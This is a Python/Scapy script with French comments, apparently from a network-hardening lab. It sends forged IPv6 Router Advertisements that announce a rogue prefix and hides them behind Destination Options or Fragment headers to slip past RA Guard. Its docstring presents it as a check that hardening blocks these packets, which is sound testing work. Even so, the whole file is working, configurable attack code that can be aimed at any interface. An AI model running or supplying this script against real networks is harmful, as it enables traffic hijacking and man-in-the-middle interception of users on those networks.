#!/usr/bin/env python3
"""
bypass_extheaders_fragmentation.py — Phase 5.2 : tentatives de contournement du RA Guard.
  --mode exthdr : RA frauduleux cache derriere un en-tete d'extension (Destination Options) -> nexthdr 60
  --mode frag   : RA frauduleux dans un paquet avec en-tete Fragment -> nexthdr 44
  --mode both   : les deux (defaut)
Apres durcissement, ces paquets doivent etre BLOQUES (0 recu cote victime, compteurs ip6 nexthdr > 0).
Utilise le prefixe pirate 2001:db8:bad:: (hexa valide).
"""
import argparse
from scapy.all import (
    Ether, IPv6, IPv6ExtHdrDestOpt, IPv6ExtHdrFragment,
    ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr, sendp,
)


def ra_payload(evil_prefix, attacker_mac):
    return (ICMPv6ND_RA(routerlifetime=1800) /
            ICMPv6NDOptPrefixInfo(prefix=evil_prefix, prefixlen=64,
                                  validlifetime=86400, preferredlifetime=14400) /
            ICMPv6NDOptSrcLLAddr(lladdr=attacker_mac))


def send_exthdr(iface, evil_prefix, attacker_mac, count, inter):
    pkt = (Ether(src=attacker_mac, dst="33:33:00:00:00:01") /
           IPv6(src="fe80::66", dst="ff02::1") /
           IPv6ExtHdrDestOpt() /
           ra_payload(evil_prefix, attacker_mac))
    sendp(pkt, iface=iface, count=count, inter=inter, verbose=False)
    print(f"[exthdr] {count} RA caches derriere un Destination Options envoyes")


def send_frag(iface, evil_prefix, attacker_mac, count, inter):
    pkt = (Ether(src=attacker_mac, dst="33:33:00:00:00:01") /
           IPv6(src="fe80::66", dst="ff02::1") /
           IPv6ExtHdrFragment(id=0x1234, m=0) /
           ra_payload(evil_prefix, attacker_mac))
    sendp(pkt, iface=iface, count=count, inter=inter, verbose=False)
    print(f"[frag] {count} RA avec en-tete Fragment (nexthdr 44) envoyes")


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--iface", required=True)
    p.add_argument("--mode", choices=["exthdr", "frag", "both"], default="both")
    p.add_argument("--attacker-mac", default="02:00:00:00:00:66")
    p.add_argument("--evil-prefix", default="2001:db8:bad::")
    p.add_argument("--count", type=int, default=5)
    p.add_argument("--inter", type=float, default=0.5)
    args = p.parse_args()

    if args.mode in ("exthdr", "both"):
        send_exthdr(args.iface, args.evil_prefix, args.attacker_mac, args.count, args.inter)
    if args.mode in ("frag", "both"):
        send_frag(args.iface, args.evil_prefix, args.attacker_mac, args.count, args.inter)


if __name__ == "__main__":
    main()